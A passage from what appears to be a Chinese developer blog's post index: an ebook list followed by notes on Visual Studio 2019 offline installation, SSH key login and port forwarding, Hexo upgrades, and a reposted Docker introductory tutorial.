实战(精髓)REST 实战Java 编码规范Apache MINA 2 用户指南H2 Database 教程Java Servlet 3.1 规范JSSE 参考指南Java开源实现及最佳实践Java 编程要点Think JavaJava 8 简明教程On Java 8 中文版 (翻译中)「返回目录」JavaScript现代 Javascript 教程Google JavaScript 代码风格指南Google JSON 风格指南Airbnb JavaScript 规范JavaScript 标准参考教程（alpha）Javascript编程指南 (源码)javascript 的 12 个怪癖JavaScript 秘密花园JavaScript核心概念及实践 (PDF) (此书已由人民邮电出版社出版发行，但作者依然免费提供PDF版本，希望开发者们去购买，支持作者)《JavaScript 模式》 “JavaScript patterns”中译本命名函数表达式探秘 (注:原文由为之漫笔翻译，原始地址无法打开，所以此处地址为我博客上的备份)学用 JavaScript 设计模式 (开源中国)深入理解JavaScript系列ECMAScript 5.1 中文版ECMAScript 6 入门 (作者：阮一峰)JavaScript Promise迷你书You-Dont-Know-JS (深入JavaScript语言核心机制的系列图书)JavaScript 教程 廖雪峰MDN JavaScript 中文文档jQueryjQuery 解构简单易懂的JQuery魔法How to write jQuery pluginYou Don't Need jQuery如何实现一个类jQuery？Node.jsNode入门七天学会NodeJSNodejs Wiki Book (繁体中文)express.js 中文文档koa 中文文档一起学koa使用 Express + MongoDB 搭建多人博客Express框架Node.js 包教不包会Learn You The Node.js For Much Win! (中文版)Node debug 三法三例nodejs中文文档orm2 中文文档一起学 Node.jsunderscore.jsUnderscore.js中文文档backbone.jsbackbone.js中文文档backbone.js入门教程 (PDF)Backbone.js入门教程第二版Developing Backbone.js Applications(中文版)AngularJSAngularJS最佳实践和风格指南AngularJS中译本AngularJS入门教程构建自己的AngularJS在Windows环境下用Yeoman构建AngularJS项目Zepto.jsZepto.js 中文文档Sea.jsHello Sea.jsReact.jsReact 学习之道React.js 小书React.js 中文文档React webpack-cookbookReact 入门教程React Native 中文文档(含最新Android内容)Learn React &amp; Webpack by building the Hacker News front pageimpress.jsimpress.js的中文教程CoffeeScriptCoffeeScript CookbookThe Little Book on CoffeeScript中文版CoffeeScript 编码风格指南TypeSciptTypeScript HandbookExtJSExt4.1.0 中文文档MeteorDiscover MeteorMeteor 中文文档Angular-Meteor 中文教程Chrome扩展及应用开发「返回目录」Kotlindeveloping-android-apps-with-kotlin「返回目录」LaTeX一份其实很短的 LaTeX 入门文档一份不太简短的 LATEX 2ε 介绍 （PDF版）「返回目录」LISPCommon LispANSI Common Lisp 中文翻譯版On Lisp 中文翻译版本SchemeYet Another Scheme Tutorial Scheme入门教程Scheme语言简明教程RacketRacket book「返回目录」LuaLua编程入门Lua 5.1 参考手册 中文翻译Lua 5.3 参考手册 中文翻译Lua源码欣赏「返回目录」OCamlReal World OCaml「返回目录」PerlModern Perl 中文版Perl 程序员应该知道的事「返回目录」PHPPHP 官方手册PHP调试技术手册(PDF)PHP之道：php-the-right-way (@wulijun版 PHPHub版)PHP 最佳实践PHP 开发者实践深入理解PHP内核PHP扩展开发及内核应用Laravel5.1 中文文档Laravel 5.1 LTS 速查表Symfony2 Cookbook 中文版(版本 2.7.0 LTS)Symfony2中文文档 (未译完)YiiBook几本Yii框架的在线教程深入理解 Yii 2.0Yii 框架中文文檔简单易懂的PHP魔法swoole文档及入门教程Composer 中文网Slim 中文文档Lumen 中文文档PHPUnit 中文文档「返回目录」Prolog笨办法学Prolog「返回目录」Python廖雪峰 Python 2.7 中文教程廖雪峰 Python 3 中文教程简明Python教程简明 Python 教程(Python 3)零基础学 Python 第一版零基础学 Python 第二版可爱的 PythonPython 2.7 官方教程中文版Python 3.3 官方教程中文版Python Cookbook 中文版Python3 Cookbook 中文版深入 Python深入 Python 3PEP8 Python代码风格规范Google Python 风格指南 中文版Python入门教程 (PDF)笨办法学 Python (PDF EPUB)Python自然语言处理中文版 （感谢陈涛同学的翻译）Python 绘图库 matplotlib 官方指南中文翻译Scrapy 0.25 文档ThinkPythonThinkPython 2edPython快速教程Python 正则表达式操作指南python初级教程：入门详解Twisted 与异步编程入门TextGrocery 中文 API ( 基于svm算法的一个短文本分类 Python 库 )Requests: HTTP for HumansPillow 中文文档PyMOTW 中文版Python 官方文档中文版Fabric 中文文档Beautiful Soup 4.2.0 中文文档Python 中的 Socket 编程用Python做科学计算Sphinx 中文文档精通 Python 设计模式python 安全编程教程程序设计思想与方法知乎周刊·编程小白学PythonScipy 讲义Python 学习笔记 基础篇Python 学习笔记 模块篇Python 标准库 中文版Python进阶Python 核心编程 第二版 CPyUG译Python最佳实践指南Python 精要教程Python 量化交易教程DjangoDjango 1.5 文档中文版 正在翻译中Django 2.0 文档中文版Django 最佳实践Django 2.1 搭建个人博客教程 ( 编写中 )Django搭建简易博客教程The Django Book 中文版Django 设计模式与最佳实践Django 网站开发 CookbookDjango Girls 學習指南FlaskFlask 文档中文版Jinja2 文档中文版Werkzeug 文档中文版Flask之旅Flask 扩展文档汇总Flask 大型教程SQLAlchemy 中文文档web.pyweb.py 0.3 新手指南Web.py Cookbook 简体中文版TornadoIntroduction to Tornado 中文翻译Tornado源码解析Tornado 4.3 文档中文版「返回目录」RR语言忍者秘笈「返回目录」RubyRuby 风格指南Rails 风格指南笨方法學 RubyRuby on Rails 指南Ruby on Rails 实战圣经Ruby on Rails Tutorial 原书第 3 版 (本书网页版免费，下载版需购买)Rails 实践Rails 5 开发进阶(Beta)Rails 102编写Ruby的C拓展Ruby 源码解读Ruby中的元编程「返回目录」RustRust编程语言 中文翻译Rust Primer「返回目录」ScalaScala课堂 (Twitter的Scala中文教程)Effective Scala(Twitter的Scala最佳实践的中文翻译)Scala指南「返回目录」ShellShell脚本编程30分钟入门Bash脚本15分钟进阶教程Linux工具快速教程shell十三问Shell编程范例「返回目录」SwiftThe Swift Programming Language 中文版Swift 语言指南Stanford 公开课，Developing iOS 8 Apps with Swift 字幕翻译文件C4iOS - COSMOS「返回目录」读书笔记及其它编译原理（紫龙书）中文第2版习题答案把《编程珠玑》读薄Effective C++读书笔记Golang 学习笔记、Python 学习笔记、C 学习笔记 (PDF)Jsoup 学习笔记学习笔记: Vim、Python、memcached图灵开放书翻译计划--C++、Python、Java等蒂姆·奥莱利随笔 （由译言网翻译，电子版免费）SICP 解题集精彩博客集合中文文案排版指北Standard C 语言标准函数库速查 (Cheat Sheet)Git Cheatsheet ChsGitBook简明教程JavaScript语言精粹制造开源软件提问的智慧Markdown 入门参考AsciiDoc简明指南背包问题九讲老齐的技术资料前端技能汇总借助开源项目，学习软件开发前端工作面试问题leetcode/lintcode题解/算法学习笔记前端开发笔记本LeetCode题解《不可替代的团队领袖培养计划》「返回目录」操作系统开源世界旅行手册鸟哥的 Linux 私房菜Linux 就该这么学The Linux Command Line (中英文版)Linux 设备驱动 (第三版)深入分析Linux内核源码UNIX TOOLBOXDocker中文指南Docker —— 从入门到实践Docker入门实战Docker Cheat SheetFreeRADIUS新手入门Mac 开发配置手册FreeBSD 使用手册Linux 命令行(中文版)Linux 构建指南Linux工具快速教程Linux Documentation (中文版)嵌入式 Linux 知识库 (eLinux.org 中文版)理解Linux进程命令行的艺术SystemTap新手指南操作系统思考「返回目录」智能系统一步步搭建物联网系统「返回目录」分布式系统走向分布式「返回目录」编译原理《计算机程序的结构和解释》公开课 翻译项目「返回目录」函数式概念傻瓜函数编程「返回目录」计算机图形学OpenGL 教程WebGL自学网《Real-Time Rendering 3rd》提炼总结「返回目录」WEB服务器Nginx开发从入门到精通 (淘宝团队出品)Nginx教程从入门到精通(PDF版本，运维生存时间出品)OpenResty最佳实践Apache 中文手册「返回目录」版本控制Git教程 （本文由 廖雪峰 创作）git - 简易指南猴子都能懂的GIT入门Git 参考手册Pro GitPro Git 中文版 (整理在gitbook上)Git MagicGotGitHubGit权威指南Git Community Book 中文版Mercurial 使用教程HgInit (中文版)沉浸式学 GitGit-Cheat-Sheet （感谢 @flyhigher139 翻译了中文版）GitHub秘籍GitHub帮助文档git-flow 备忘清单svn 手册GitHub漫游指南「返回目录」编辑器exvim--vim 改良成IDE项目笨方法学Vimscript 中译本Vim中文文档所需即所获：像 IDE 一样使用 vimvim 实操教程Atom飞行手册中文版Markdown·简单的世界一年成为 Emacs 高手Emacs 生存指南Atom官方手册「返回目录」NoSQLNoSQL数据库笔谈Redis 设计与实现Redis 命令参考带有详细注释的 Redis 3.0 代码带有详细注释的 Redis 2.6 代码The Little MongoDB BookThe Little Redis BookNeo4j 简体中文手册 v1.8Neo4j .rb 中文資源Disque 使用教程Apache Spark 设计与实现「返回目录」PostgreSQLPostgreSQL 8.2.3 中文文档PostgreSQL 9.3.1 中文文档PostgreSQL 9.5.3 中文文档「返回目录」MySQLMySQL索引背后的数据结构及算法原理21分钟MySQL入门教程「返回目录」管理和监控ELKstack 中文指南Mastering Elasticsearch(中文版)ElasticSearch 权威指南Elasticsearch 权威指南（中文版）Logstash 最佳实践Puppet 2.7 Cookbook 中文版「返回目录」项目相关持续集成（第二版） (译言网)让开发自动化系列专栏追求代码质量selenium 中文文档Selenium Webdriver 简易教程Joel谈软件約耳談軟體(Joel on Software)Gradle 2 用户指南Gradle 中文使用文档编码规范开源软件架构GNU make 指南GNU make 中文手册The Twelve-Factor App「返回目录」设计模式图说设计模式史上最全设计模式导学目录design pattern 包教不包会设计模式 Java 版「返回目录」Web关于浏览器和网络的 20 项须知浏览器开发工具的秘密Chrome 开发者工具中文手册Chrome扩展开发文档Grunt中文文档gulp中文文档Gulp 入门指南移动Web前端知识库正则表达式30分钟入门教程前端开发体系建设日记移动前端开发收藏夹JSON风格指南HTTP 接口设计指北前端资源分享（一）前端资源分享（二）前端代码规范 及 最佳实践前端开发者手册前端工程师手册w3school教程整理Wireshark用户手册一站式学习WiresharkHTTP 下午茶HTTP/2.0 中文翻译RFC 7540 - HTTP/2 中文翻译版http2讲解3 Web Designs in 3 Weeks站点可靠性工程「返回目录」大数据大数据/数据挖掘/推荐系统/机器学习相关资源面向程序员的数据挖掘指南大型集群上的快速和通用数据处理架构数据挖掘中经典的算法实现和详细的注释Spark 编程指南简体中文版「返回目录」编程艺术程序员编程艺术每个程序员都应该了解的内存知识(译)【第一部分】取悦的工序：如何理解游戏 (豆瓣阅读，免费书籍)「返回目录」其它OpenWrt智能、自动、透明那个啥路由器教程SAN 管理入门系列Sketch 中文手册深入理解并行编程程序员的自我修养Growth: 全栈增长工程师指南「返回目录」","tags":"编程电子书"},{"title":"vs2019专题","url":"/20210420/vs2019-zhuan-ti/","text":"安装/下载 ※官方手册 ※在线安装 引导程序 ※离线安装 首先从 Visual Studio 下载页或 Visual Studio 2019 版本页下载 Visual Studio 2019 引导程序，以找到所选版本的 Visual Studio。 安装程序文件或引导程序将是以下项之一，或与之类似： 版本 文件 Visual Studio Community vs_community.exe Visual Studio Professional vs_professional.exe Visual Studio Enterprise vs_enterprise.exe Visual Studio 生成工具 vs_buildtools.exe VisualStudio生成工具是接下来将下载的缓存打包的工具。缓存所有包 1vs_community.exe --layout c:\\vslayout --lang zh-CN 安装 Visual Studio 脱机安装所需的证书 证书管理器工具 (certmgr.exe) Windows SDK中附带 12345certmgr.exe -add [layout path]\\certificates\\manifestRootCertificate.cer -n &quot;Microsoft Root Certificate Authority 2011&quot; -s -r LocalMachine rootcertmgr.exe -add [layout path]\\certificates\\manifestCounterSignRootCertificate.cer -n &quot;Microsoft Root Certificate Authority 2010&quot; -s -r LocalMachine rootcertmgr.exe -add [layout path]\\certificates\\vs_installer_opc.RootCertificate.cer -n &quot;Microsoft Root Certificate Authority 2010&quot; -s -r LocalMachine root 使用 Windows 中随附的 certutil.exe： 12345certutil.exe -addstore -f &quot;Root&quot; &quot;[layout path]\\certificates\\manifestRootCertificate.cer&quot;certutil.exe -addstore -f &quot;Root&quot; &quot;[layout path]\\certificates\\manifestCounterSignRootCertificate.cer&quot;certutil.exe -addstore -f &quot;Root&quot; &quot;[layout path]\\certificates\\vs_installer_opc.RootCertificate.cer&quot; 安装离线 12vs_enterprise.exe --layout c:\\vslayout --add Microsoft.VisualStudio.Workload.ManagedDesktop --add Microsoft.VisualStudio.Workload.NetWeb --add Component.GitHub.VisualStudio --includeOptional --lang en-USvs_enterprise.exe --noweb --add Microsoft.VisualStudio.Workload.ManagedDesktop --add Microsoft.VisualStudio.Workload.NetWeb --add Component.GitHub.VisualStudio --includeOptional","tags":"专题 visual-studio"},{"title":"ssh专题","url":"/20210411/ssh-zhuan-ti/","text":"SSH原理与运用（一）：远程登录 作者：阮一峰 Note: 六、authorized_keys文件 远程主机将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys文件中。公钥就是一段字符串，只要把它追加在authorized_keys文件的末尾就行了。 这里不使用上面的ssh-copy-id命令，改用下面的命令，解释公钥的保存过程： $ ssh user@host 'mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys' &lt; ~/.ssh/id_rsa.pub 这条命令由多个语句组成，依次分解开来看：（1）&quot;$ ssh user@host&quot;，表示登录远程主机；（2）单引号中的mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys，表示登录后在远程shell上执行的命令：（3）&quot;$ mkdir -p .ssh&quot;的作用是，如果用户主目录中的.ssh目录不存在，就创建一个；（4）'cat &gt;&gt; .ssh/authorized_keys' &lt; ~/.ssh/id_rsa.pub的作用是，将本地的公钥文件~/.ssh/id_rsa.pub，重定向追加到远程文件authorized_keys的末尾。 写入authorized_keys文件后，公钥登录的设置就完成了。 SSH原理与运用（二）：远程操作与端口转发 作者：阮一峰 Note: SSH不仅可以用于远程主机登录，还可以直接在远程主机上执行操作。 八、绑定本地端口 既然SSH可以传送数据，那么我们可以让那些不加密的网络连接，全部改走SSH连接，从而提高安全性。 假定我们要让8080端口的数据，都通过SSH传向远程主机，命令就这样写： ssh -D 8080 user@host SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到SSH连接上面，发往远程主机。可以想象，如果8080端口原来是一个不加密端口，现在将变成一个加密端口。 九、本地端口转发 有时，绑定本地端口还不够，还必须指定数据传送的目标主机，从而形成点对点的&quot;端口转发&quot;。为了区别后文的&quot;远程端口转发&quot;，我们把这种情况称为&quot;本地端口转发&quot;（Local forwarding）。 假定host1是本地主机，host2是远程主机。由于种种原因，这两台主机之间无法连通。但是，另外还有一台host3，可以同时连通前面两台主机。因此，很自然的想法就是，通过host3，将host1连上host2。 我们在host1执行下面的命令： ssh -L 2121:host2:21 host3 命令中的L参数一共接受三个值，分别是&quot;本地端口:目标主机:目标主机端口&quot;，它们之间用冒号分隔。这条命令的意思，就是指定SSH绑定本地端口2121，然后指定host3将所有的数据，转发到目标主机host2的21端口（假定host2运行FTP，默认端口为21）。 这样一来，我们只要连接host1的2121端口，就等于连上了host2的21端口。 ftp localhost:2121 “本地端口转发&quot;使得host1和host3之间仿佛形成一个数据传输的秘密隧道，因此又被称为&quot;SSH隧道”。 下面是一个比较有趣的例子。 ssh -L 5900:localhost:5900 host3 它表示将本机的5900端口绑定host3的5900端口（这里的localhost指的是host3，因为目标主机是相对host3而言的）。 另一个例子是通过host3的端口转发，ssh登录host2。 ssh -L 9001:host2:22 host3 这时，只要ssh登录本机的9001端口，就相当于登录host2了。 ssh -p 9001 localhost 上面的-p参数表示指定登录端口。 十、远程端口转发 既然&quot;本地端口转发&quot;是指绑定本地端口的转发，那么&quot;远程端口转发&quot;（remote forwarding）当然是指绑定远程端口的转发。 还是接着看上面那个例子，host1与host2之间无法连通，必须借助host3转发。但是，特殊情况出现了，host3是一台内网机器，它可以连接外网的host1，但是反过来就不行，外网的host1连不上内网的host3。这时，&quot;本地端口转发&quot;就不能用了，怎么办？ 解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了。 我们在host3执行下面的命令： ssh -R 2121:host2:21 host1 R参数也是接受三个值，分别是&quot;远程主机端口:目标主机:目标主机端口&quot;。这条命令的意思，就是让host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。由于对于host3来说，host1是远程主机，所以这种情况就被称为&quot;远程端口绑定&quot;。 绑定之后，我们在host1就可以连接host2了： ftp localhost:2121 这里必须指出，&quot;远程端口转发&quot;的前提条件是，host1和host3两台主机都有sshD和ssh客户端。 十一、SSH的其他参数 SSH还有一些别的参数，也值得介绍。 N参数，表示只连接远程主机，不打开远程shell；T参数，表示不为这个连接分配TTY。这个两个参数可以放在一起用，代表这个SSH连接只用来传数据，不执行远程操作。 ssh -NT -D 8080 host f参数，表示SSH连接成功后，转入后台运行。这样一来，你就可以在不中断SSH连接的情况下，在本地shell中执行其他操作。 ssh -f -D 8080 host 要关闭这个后台连接，就只有用kill命令去杀掉进程 SSH 教程 作者：阮一峰 https://github.com/wangdoc/ssh-tutorial","tags":"专题 ssh"},{"title":"hexo专题","url":"/20210411/hexo-zhuan-ti/","text":"[toc] hexo.io Themes Lastest Version 升级 更新hexo 1234567891011121314151617$ npm install npm-check-updates -g$ ncuChecking ....package.json[====================] 16/16 100% hexo ^4.2.0 → ^5.0.0 hexo-generator-sitemap ^2.0.0 → ^2.1.0Run ncu -u to upgrade package.json$ ncu -uUpgrading ....package.json[====================] 16/16 100% hexo ^4.2.0 → ^5.0.0 hexo-generator-sitemap ^2.0.0 → ^2.1.0Run npm install to install new versions. 升级hexo-cli 1npm install hexo-cli -g 检查 1hexo version 相关博客索引 个人博客搭建笔记----hexo根目录下的_config.yml配置解释 个人博客搭建笔记----hexo初始化目录结构和打包文件 个人博客搭建笔记----hexo自定义主题搭建 Hexo 搭建个人博客系列：进阶设置篇 Hexo主题开发","tags":"专题 hexo"},{"title":"Docker专题","url":"/20210411/docker-zhuan-ti/","text":"Docker Docker in GitHub Docker教程：Docker入门实践（精讲版） Docker 入门教程 Docker 微服务教程 以下为转载内容（转载自阮一峰）： == == == 作者： 阮一峰 日期： 2018年2月 9日 2013年发布至今， Docker 一直广受瞩目，被认为可能会改变软件行业。但是，许多人并不清楚 Docker 到底是什么，要解决什么问题，好处又在哪里？本文就来详细解释，帮助大家理解它，还带有简单易懂的实例，教你如何将它用于日常开发。 一、环境配置的难题 软件开发最大的麻烦事之一，就是环境配置。用户计算机的环境都不相同，你怎么知道自家的软件，能在那些机器跑起来？ 用户必须保证两件事：操作系统的设置，各种库和组件的安装。只有它们都正确，软件才能运行。举例来说，安装一个 Python 应用，计算机必须有 Python 引擎，还必须有各种依赖，可能还要配置环境变量。 如果某些老旧的模块与当前环境不兼容，那就麻烦了。开发者常常会说：\"它在我的机器可以跑了\"（It works on my machine），言下之意就是，其他机器很可能跑不了。 环境配置如此麻烦，换一台机器，就要重来一次，旷日费时。很多人想到，能不能从根本上解决问题，软件可以带环境安装？也就是说，安装的时候，把原始环境一模一样地复制过来。 二、虚拟机 虚拟机（virtual machine）就是带环境安装的一种解决方案。它可以在一种操作系统里面运行另一种操作系统，比如在 Windows 系统里面运行 Linux 系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。 虽然用户可以通过虚拟机还原软件的原始环境。但是，这个方案有几个缺点。 （1）资源占用多 虚拟机会独占一部分内存和硬盘空间。它运行的时候，其他程序就不能使用这些资源了。哪怕虚拟机里面的应用程序，真正使用的内存只有 1MB，虚拟机依然需要几百 MB 的内存才能运行。 （2）冗余步骤多 虚拟机是完整的操作系统，一些系统级别的操作步骤，往往无法跳过，比如用户登录。 （3）启动慢 启动操作系统需要多久，启动虚拟机就需要多久。可能要等几分钟，应用程序才能真正运行。 三、Linux 容器 由于虚拟机存在这些缺点，Linux 发展出了另一种虚拟化技术：Linux 容器（Linux Containers，缩写为 LXC）。 Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外面套了一个保护层。对于容器里面的进程来说，它接触到的各种资源都是虚拟的，从而实现与底层系统的隔离。 由于容器是进程级别的，相比虚拟机有很多优势。 （1）启动快 容器里面的应用，直接就是底层系统的一个进程，而不是虚拟机内部的进程。所以，启动容器相当于启动本机的一个进程，而不是启动一个操作系统，速度就快很多。 （2）资源占用少 容器只占用需要的资源，不占用那些没有用到的资源；虚拟机由于是完整的操作系统，不可避免要占用所有资源。另外，多个容器可以共享资源，虚拟机都是独享资源。 （3）体积小 容器只要包含用到的组件即可，而虚拟机是整个操作系统的打包，所以容器文件比虚拟机文件要小很多。 总之，容器有点像轻量级的虚拟机，能够提供虚拟化的环境，但是成本开销小得多。 四、Docker 是什么？ Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。 Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就不用担心环境问题。 总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。 五、Docker 的用途 Docker 的主要用途，目前有三大类。 （1）提供一次性的环境。比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。 （2）提供弹性的云服务。因为 Docker 容器可以随开随关，很适合动态扩容和缩容。 （3）组建微服务架构。通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。 六、Docker 的安装 Docker 是一个开源的商业产品，有两个版本：社区版（Community Edition，缩写为 CE）和企业版（Enterprise Edition，缩写为 EE）。企业版包含了一些收费服务，个人开发者一般用不到。下面的介绍都针对社区版。 Docker CE 的安装请参考官方文档。 MacWindowsUbuntuDebianCentOSFedora其他 Linux 发行版 安装完成后，运行下面的命令，验证是否安装成功。 $ docker version 或者 $ docker info Docker 需要用户具有 sudo 权限，为了避免每次命令都输入sudo，可以把用户加入 Docker 用户组（官方文档）。 $ sudo usermod -aG docker $USER Docker 是服务器----客户端架构。命令行运行docker命令的时候，需要本机有 Docker 服务。如果这项服务没有启动，可以用下面的命令启动（官方文档）。 service 命令的用法 $ sudo service docker start systemctl 命令的用法 $ sudo systemctl start docker 六、image 文件 Docker 把应用程序及其依赖，打包在 image 文件里面。只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。 image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。 列出本机的所有 image 文件。 $ docker image ls 删除 image 文件 $ docker image rm [imageName] image 文件是通用的，一台机器的 image 文件拷贝到另一台机器，照样可以使用。一般来说，为了节省时间，我们应该尽量使用别人制作好的 image 文件，而不是自己制作。即使要定制，也应该基于别人的 image 文件进行加工，而不是从零开始制作。 为了方便共享，image 文件制作完成后，可以上传到网上的仓库。Docker 的官方仓库 Docker Hub 是最重要、最常用的 image 仓库。此外，出售自己制作的 image 文件也是可以的。 七、实例：hello world 下面，我们通过最简单的 image 文件\"hello world\"，感受一下 Docker。 需要说明的是，国内连接 Docker 的官方仓库很慢，还会断线，需要将默认仓库改成国内的镜像网站，具体的修改方法在下一篇文章的第一节。有需要的朋友，可以先看一下。 首先，运行下面的命令，将 image 文件从仓库抓取到本地。 $ docker image pull library/hello-world 上面代码中，docker image pull是抓取 image 文件的命令。library/hello-world是 image 文件在仓库里面的位置，其中library是 image 文件所在的组，hello-world是 image 文件的名字。 由于 Docker 官方提供的 image 文件，都放在library组里面，所以它的是默认组，可以省略。因此，上面的命令可以写成下面这样。 $ docker image pull hello-world 抓取成功以后，就可以在本机看到这个 image 文件了。 $ docker image ls 现在，运行这个 image 文件。 $ docker container run hello-world docker container run命令会从 image 文件，生成一个正在运行的容器实例。 注意，docker container run命令具有自动抓取 image 文件的功能。如果发现本地没有指定的 image 文件，就会从仓库自动抓取。因此，前面的docker image pull命令并不是必需的步骤。 如果运行成功，你会在屏幕上读到下面的输出。 $ docker container run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. ... ... 输出这段提示以后，hello world就会停止运行，容器自动终止。 有些容器不会自动终止，因为提供的是服务。比如，安装运行 Ubuntu 的 image，就可以在命令行体验 Ubuntu 系统。 $ docker container run -it ubuntu bash 对于那些不会自动终止的容器，必须使用docker container kill 命令手动终止。 $ docker container kill [containID] 八、容器文件 image 文件生成的容器实例，本身也是一个文件，称为容器文件。也就是说，一旦容器生成，就会同时存在两个文件： image 文件和容器文件。而且关闭容器并不会删除容器文件，只是容器停止运行而已。 列出本机正在运行的容器 $ docker container ls 列出本机所有容器，包括终止运行的容器 $ docker container ls --all 上面命令的输出结果之中，包括容器的 ID。很多地方都需要提供这个 ID，比如上一节终止容器运行的docker container kill命令。 终止运行的容器文件，依然会占据硬盘空间，可以使用docker container rm命令删除。 $ docker container rm [containerID] 运行上面的命令之后，再使用docker container ls --all命令，就会发现被删除的容器文件已经消失了。 九、Dockerfile 文件 学会使用 image 文件以后，接下来的问题就是，如何可以生成 image 文件？如果你要推广自己的软件，势必要自己制作 image 文件。 这就需要用到 Dockerfile 文件。它是一个文本文件，用来配置 image。Docker 根据 该文件生成二进制的 image 文件。 下面通过一个实例，演示如何编写 Dockerfile 文件。 十、实例：制作自己的 Docker 容器 下面我以 koa-demos 项目为例，介绍怎么写 Dockerfile 文件，实现让用户在 Docker 容器里面运行 Koa 框架。 作为准备工作，请先下载源码。 $ git clone https://github.com/ruanyf/koa-demos.git $ cd koa-demos 10.1 编写 Dockerfile 文件 首先，在项目的根目录下，新建一个文本文件.dockerignore，写入下面的内容。 .git node_modules npm-debug.log 上面代码表示，这三个路径要排除，不要打包进入 image 文件。如果你没有路径要排除，这个文件可以不新建。 然后，在项目的根目录下，新建一个文本文件 Dockerfile，写入下面的内容。 FROM node:8.4 COPY . /app WORKDIR /app RUN npm install --registry=https://registry.npm.taobao.org EXPOSE 3000 上面代码一共五行，含义如下。 FROM node:8.4：该 image 文件继承官方的 node image，冒号表示标签，这里标签是8.4，即8.4版本的 node。 COPY . /app：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的/app目录。 WORKDIR /app：指定接下来的工作路径为/app。 RUN npm install：在/app目录下，运行npm install命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。 EXPOSE 3000：将容器 3000 端口暴露出来， 允许外部连接这个端口。 10.2 创建 image 文件 有了 Dockerfile 文件以后，就可以使用docker image build命令创建 image 文件了。 $ docker image build -t koa-demo . 或者 $ docker image build -t koa-demo:0.0.1 . 上面代码中，-t参数用来指定 image 文件的名字，后面还可以用冒号指定标签。如果不指定，默认的标签就是latest。最后的那个点表示 Dockerfile 文件所在的路径，上例是当前路径，所以是一个点。 如果运行成功，就可以看到新生成的 image 文件koa-demo了。 $ docker image ls 10.3 生成容器 docker container run命令会从 image 文件生成容器。 $ docker container run -p 8000:3000 -it koa-demo /bin/bash 或者 $ docker container run -p 8000:3000 -it koa-demo:0.0.1 /bin/bash 上面命令的各个参数含义如下： -p参数：容器的 3000 端口映射到本机的 8000 端口。 -it参数：容器的 Shell 映射到当前的 Shell，然后你在本机窗口输入的命令，就会传入容器。 koa-demo:0.0.1：image 文件的名字（如果有标签，还需要提供标签，默认是 latest 标签）。 /bin/bash：容器启动以后，内部第一个执行的命令。这里是启动 Bash，保证用户可以使用 Shell。 如果一切正常，运行上面的命令以后，就会返回一个命令行提示符。 [email&#160;protected]:/app# 这表示你已经在容器里面了，返回的提示符就是容器内部的 Shell 提示符。执行下面的命令。 [email&#160;protected]:/app# node demos/01.js 这时，Koa 框架已经运行起来了。打开本机的浏览器，访问 http://127.0.0.1:8000，网页显示\"Not Found\"，这是因为这个 demo 没有写路由。 这个例子中，Node 进程运行在 Docker 容器的虚拟环境里面，进程接触到的文件系统和网络接口都是虚拟的，与本机的文件系统和网络接口是隔离的，因此需要定义容器与物理机的端口映射（map）。 现在，在容器的命令行，按下 Ctrl + c 停止 Node 进程，然后按下 Ctrl + d （或者输入 exit）退出容器。此外，也可以用docker container kill终止容器运行。 在本机的另一个终端窗口，查出容器的 ID $ docker container ls 停止指定的容器运行 $ docker container kill [containerID] 容器停止运行之后，并不会消失，用下面的命令删除容器文件。 查出容器的 ID $ docker container ls --all 删除指定的容器文件 $ docker container rm [containerID] 也可以使用docker container run命令的--rm参数，在容器终止运行后自动删除容器文件。 $ docker container run --rm -p 8000:3000 -it koa-demo /bin/bash 10.4 CMD 命令 上一节的例子里面，容器启动以后，需要手动输入命令node demos/01.js。我们可以把这个命令写在 Dockerfile 里面，这样容器启动以后，这个命令就已经执行了，不用再手动输入了。 FROM node:8.4 COPY . /app WORKDIR /app RUN npm install --registry=https://registry.npm.taobao.org EXPOSE 3000 CMD node demos/01.js 上面的 Dockerfile 里面，多了最后一行CMD node demos/01.js，它表示容器启动后自动执行node demos/01.js。 你可能会问，RUN命令与CMD命令的区别在哪里？简单说，RUN命令在 image 文件的构建阶段执行，执行结果都会打包进入 image 文件；CMD命令则是在容器启动后执行。另外，一个 Dockerfile 可以包含多个RUN命令，但是只能有一个CMD命令。 注意，指定了CMD命令以后，docker container run命令就不能附加命令了（比如前面的/bin/bash），否则它会覆盖CMD命令。现在，启动容器可以使用下面的命令。 $ docker container run --rm -p 8000:3000 -it koa-demo:0.0.1 10.5 发布 image 文件 容器运行成功后，就确认了 image 文件的有效性。这时，我们就可以考虑把 image 文件分享到网上，让其他人使用。 首先，去 hub.docker.com 或 cloud.docker.com 注册一个账户。然后，用下面的命令登录。 $ docker login 接着，为本地的 image 标注用户名和版本。 $ docker image tag [imageName] [username]/[repository]:[tag] 实例 $ docker image tag koa-demos:0.0.1 ruanyf/koa-demos:0.0.1 也可以不标注用户名，重新构建一下 image 文件。 $ docker image build -t [username]/[repository]:[tag] . 最后，发布 image 文件。 $ docker image push [username]/[repository]:[tag] 